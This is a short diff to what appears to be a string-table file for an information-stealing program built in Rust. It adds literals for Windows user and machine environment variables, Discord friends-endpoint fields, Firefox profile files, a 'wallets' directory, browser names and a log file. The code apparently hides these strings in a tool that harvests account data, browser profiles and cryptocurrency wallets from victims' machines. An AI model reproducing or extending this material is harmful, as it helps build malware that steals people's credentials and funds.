@@ -536,6 +536,36 @@ STRINGS = [
     ("api_kernel32", "kernel32"),
     ("api_ntdll", "ntdll"),
     ("api_setenv", "SetEnvironmentVariableW"),
+
+    # === main.rs - env vars and filenames ===
+    ("env_computername", "COMPUTERNAME"),
+    ("env_userdomain", "USERDOMAIN"),
+    ("env_username", "USERNAME"),
+    ("main_unknown", "unknown"),
+    ("main_log_file", "n0.log"),
+
+    # === discord/mod.rs - JSON field names (friends endpoint) ===
+    ("discord_field_type", "type"),
+    ("discord_field_user", "user"),
+    ("discord_field_username", "username"),
+    ("discord_field_id", "id"),
+    ("discord_field_public_flags", "public_flags"),
+    ("discord_ua_header", "User-Agent"),
+
+    # === gecko/mod.rs + paths.rs - env vars used directly ===
+    ("env_programfiles", "ProgramFiles"),
+    ("env_programfiles86", "ProgramFiles(x86)"),
+    ("env_path", "PATH"),
+
+    # === gecko/base.rs - profile file names ===
+    ("gck_parent_lock_file", "parent.lock"),
+    ("gck_profile_default", "Default"),
+    ("gck_ini_key_name", "Name"),
+    ("gck_ini_key_path", "Path"),
+
+    # === paths.rs - all_browsers() bare literals ===
+    ("paths_wallets_dir", "wallets"),
+    ("paths_opera_neon", "Opera Neon"),
 ]
 
 
